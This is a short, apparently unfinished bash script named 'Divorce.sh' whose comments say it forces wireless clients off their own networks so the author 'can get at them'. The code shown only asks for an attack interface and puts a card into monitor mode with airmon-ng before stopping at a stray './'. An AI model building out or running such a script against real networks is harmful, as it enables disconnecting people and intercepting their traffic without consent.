#!/bin/bash

#############################################################################
#				Divorce.sh				    #
#  You've been spending too much time on that other internet connection.... #
#############################################################################
# Rips away clients from their other wireless networks to where we can get at them

echo "Enter Attack Interface"
read wlan

#place the card into monitor mode
./airmon-ng start $wlan
./
